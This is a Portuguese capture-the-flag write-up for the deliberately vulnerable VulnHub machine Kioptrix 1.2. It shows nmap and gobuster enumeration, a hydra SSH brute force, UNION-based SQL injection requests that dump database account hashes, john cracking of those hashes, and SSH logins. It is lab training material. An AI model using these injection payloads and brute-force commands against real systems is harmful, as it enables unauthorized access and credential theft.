---
title: "VulnHub - Kioptrix 1.2 #3"
tags: [Linux,Easy,Web,Gobuster,SQLInjection,Linpeas,Brute Force]
categories: VulnHub OSCP
---

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-kioptrix1.2/inicial.png)

Link: [Kioptrix 1.2](https://www.vulnhub.com/entry/kioptrix-level-12-3,24/)

# Enumeração

## Primeiro passo é rodar o arp-scan para detectarmos os hosts

```bash
arp-scan -I eth1 192.168.56.0/24
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-kioptrix1.2/arp.png)

## Segundo passo é rodar o nmap contra a máquina, para verificar quais portas estão abertas e quais serviços estão sendo disponibilizados pelas portas.

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-kioptrix1.2/nmap.png)

Full ports scan

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-kioptrix1.2/nmap1.png)

### Explicação de cada parâmetro do Nmap

> -sC --> Rodar alguns scripts padrão em cada porta

> -sV --> Levantar qual serviço está rodando na porta

> -Pn --> Já considera o host ativo

> -T5 --> Modo insano

### Verificamos que temos 2 portas abertas no servidor

> Porta 22 -> SSH

> Porta 80 -> Web

## Enumeração da Porta 80

Acessamos a página web para verificar do que se trata

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-kioptrix1.2/web.png)

Gobuster nela

```bash
gobuster dir -u http://192.168.56.146 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php -t 30
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-kioptrix1.2/gobuster.png)

Como foi indicado pelo criador da máquina, devemos alterar no /etc/hosts

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-kioptrix1.2/hosts.png)

Navegando na página encontramos um usuário, então vamos fazer um brute force no ssh com esse usuário

```bash
hydra -l loneferret -P /usr/share/wordlists/rockyou.txt 192.168.56.146 ssh -t 4
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-kioptrix1.2/hydra.png)

Encontramos também que ela tem um blog

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-kioptrix1.2/blog.png)

## SQLInjection

Dentro desse blog encontramos um ponto onde podemos classificar as fotos pelo número do ID delas, isso nos chamou atenção para explorar um SQLInjection ali

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-kioptrix1.2/blog1.png)

Testamos e vemos que temos uma mensagem de erro, possivelmente vulnerável a SQLInjection

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-kioptrix1.2/blog2.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-kioptrix1.2/blog3.png)

Agora jogamos para o BurpSuite para ficar melhor de explorar

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-kioptrix1.2/burp.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-kioptrix1.2/burp1.png)

Repeater

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-kioptrix1.2/burp2.png)

Após vários testes conseguimos achar a query que nos retorna o que queremos

```
1+union+select+1,2,3,4,5,6
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-kioptrix1.2/sql.png)

Achamos que o ponto vulnerável é o 2

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-kioptrix1.2/sql1.png)

Agora vamos utilizar da INFORMATION_SCHEMA, que é um padrão do mysql, ele tem um "rascunho" de todas as colunas e tabelas do banco de dados

Aqui está o site onde podem ser retiradas as informações necessárias sobre essa tabela [MYSQL](https://dev.mysql.com/doc/refman/8.0/en/information-schema.html)

database = SCHEMA_NAME from INFORMATION_SCHEMA.SCHEMATA

```
GET /gallery/gallery.php?id=-1+union+select+1,SCHEMA_NAME,3,4,5,6+FROM+INFORMATION_SCHEMA.SCHEMATA HTTP/1.1
```

Encontramos 3 databases, a gallery, a mysql e a information schema

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-kioptrix1.2/sql2.png)

Vamos extrair agora as Tables, para isso vamos usar a query Group Concat pois ela possibilita termos mais de um resultado na mesma linha, facilitando assim a extração de informações

Aqui temos todas as databases deles

```
GET /gallery/gallery.php?id=-1+union+select+1,GROUP_CONCAT(SCHEMA_NAME),3,4,5,6+FROM+INFORMATION_SCHEMA.SCHEMATA HTTP/1.1
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-kioptrix1.2/sql3.png)

Aqui podemos ver que apacereu na mesma linhas as três databases

E aqui vemos que temos várias Tables dentro da Database Gallery, que é a que vamos enumerar

```
GET /gallery/gallery.php?id=-1+union+select+1,GROUP_CONCAT(TABLE_NAME),3,4,5,6+FROM+INFORMATION_SCHEMA.TABLES+WHERE+TABLE_SCHEMA+=+"GALLERY" HTTP/1.1
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-kioptrix1.2/sql4.png)

dev_accounts,gallarific_comments,gallarific_galleries,gallarific_photos,gallarific_settings,gallarific_stats,gallarific_users

Vamos extrair primeiro informações da Gallery

```
GET /gallery/gallery.php?id=-1+union+select+1,GROUP_CONCAT(COLUMN_NAME),3,4,5,6+FROM+INFORMATION_SCHEMA.COLUMNS+WHERE+TABLE_SCHEMA+=+"GALLERY" HTTP/1.1
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-kioptrix1.2/sql5.png)

Agora verificamos todas as tables e colunas

```
GET /gallery/gallery.php?id=-1+union+select+1,GROUP_CONCAT(TABLE_NAME,":",COLUMN_NAME),3,4,5,6+FROM+INFORMATION_SCHEMA.COLUMNS+WHERE+TABLE_SCHEMA+=+"GALLERY" HTTP/1.1
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-kioptrix1.2/sql6.png)

O que essa query vai me trazer? Traduzindo… me traga o nome das colunas (COLUMN_NAME) dentro da information schema de todas as colunas (INFORMATION_SCHEMA.COLUMNS) onde eu quero somente da database GALLERY (TABLE_SCHEMA) e o nome da tabela dentro dessa database é a (TABLE_NAME). Ficou melhor assim?

Certo, agora vamos extrair aquelas informações da database gallery com as tables dev_accounts e as colunas username e password

```
GET /gallery/gallery.php?id=-1+union+select+1,GROUP_CONCAT(username,":",password),3,4,5,6+FROM+dev_accounts
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-kioptrix1.2/sql7.png)

```
dreg:0d3eccfb887aabd50f243b3f155c0f85,loneferret:5badcaf789d3d1d09794d8f021f40f0e
```

Dois hashes, vamos quebrar eles

```bash
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-kioptrix1.2/sql8.png)

```
loneferret:starwars
dreg:Mast3r
```

Paralelo a isso o nosso hydra que deixamos lá em cima rodando conseguiu achar a senha também!

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-kioptrix1.2/hydra1.png)

# Acesso SSH

Agora acessamos os dois usuários via SSH

Dreg

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-kioptrix1.2/dreg.png)

Loneferret

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-kioptrix1.2/lone.png)

Agora vamos iniciar a escalação de privilégios para root
